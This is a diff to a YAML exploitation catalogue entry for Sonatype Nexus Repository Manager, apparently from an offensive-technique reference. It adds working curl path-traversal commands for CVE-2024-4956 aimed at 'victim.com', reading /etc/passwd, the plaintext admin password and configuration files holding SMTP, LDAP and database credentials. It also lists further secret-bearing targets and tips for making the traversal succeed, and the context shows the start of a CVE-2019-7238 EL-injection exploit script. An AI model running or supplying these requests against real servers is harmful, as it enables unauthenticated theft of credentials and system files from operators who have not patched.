@@ -2,6 +2,13 @@
 comment: |
   Sonatype Nexus Repository Manager (NXRM) is a Java-based artifact repository manager.
 
+  CVE-2024-4956 (CVSS 9.8, CISA KEV): Unauthenticated path traversal in NXRM 3 < 3.58.0-01.
+  The repository URL handler does not sanitise encoded slash sequences, allowing an attacker to
+  traverse the filesystem by submitting a GET request with URL-encoded path traversal sequences.
+  File content is returned directly in the HTTP response body.
+  Ref: https://www.exploit-db.com/exploits/51974
+  nuclei: CVE-2024-4956
+
   CVE-2019-7238 (CVSS 9.8): Unauthenticated RCE via Expression Language (EL) injection in the
   NXRM 3 REST API. The search endpoint passes user-supplied input to a Java EL evaluator without
   sanitisation, allowing arbitrary Java method invocation through ${...} expressions.
@@ -59,6 +66,31 @@ functions:
     version: |
       NXRM 3 < 3.15.0
   file-read:
+  - code: "# CVE-2024-4956: unauthenticated path traversal \u2014 file content returned\
+      \ in HTTP response body\n\n# Read /etc/passwd:\ncurl -s --path-as-is \"http://victim.com:8081/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2Fetc%2Fpasswd\"\
+      \n\n# Read Nexus admin password (first-run, plaintext):\ncurl -s --path-as-is\
+      \ \"http://victim.com:8081/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2Fnexus-data%2Fadmin.password\"\
+      \n\n# Read Nexus configuration (SMTP, LDAP, DB credentials):\ncurl -s --path-as-is\
+      \ \"http://victim.com:8081/%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2Fnexus-data%2Fetc%2Fnexus.properties\"\
+      \n\n# Alternative: single-slash form (works on some installs)\ncurl -s --path-as-is\
+      \ \"http://victim.com:8081/%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\"\n"
+    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2024-4956:\
+      \ The Nexus Repository Manager 3 HTTP handler does not normalise URL-encoded\n\
+      slash characters (%2F) before resolving the repository path, allowing traversal\
+      \ out of\nthe repository root. The raw filesystem path is resolved and the file\
+      \ content returned\nverbatim in the HTTP response body \u2014 no authentication\
+      \ required.\n\nKey targets:\n- /nexus-data/admin.password \u2014 plaintext admin\
+      \ password (first-run only, deleted after change)\n- /nexus-data/etc/nexus.properties\
+      \ \u2014 Nexus configuration including SMTP and DB DSN\n- /etc/passwd, /etc/shadow\
+      \ \u2014 system user enumeration\n- /proc/1/environ \u2014 process environment\
+      \ (may contain secrets injected via Docker env vars)\n\nThe number of leading\
+      \ %2F sequences required varies by install depth; 12 slashes covers\nmost default\
+      \ Linux deployments. Use --path-as-is to prevent curl from normalising the URL.\n\
+      \nRef: https://www.exploit-db.com/exploits/51974\nnuclei: CVE-2024-4956\n"
+    contexts:
+      unauthenticated:
+    version: |-
+      NXRM 3 < 3.58.0-01
   - code: "# CVE-2019-7238: read a file from the server via EL injection \u2014 output\
       \ captured in response\npython3 - <<'EOF'\nimport requests, json\n\nTARGET =\
       \ \"http://victim.com:8081\"\nFILE   = \"/etc/passwd\"\n# Key targets:\n# /nexus-data/admin.password\
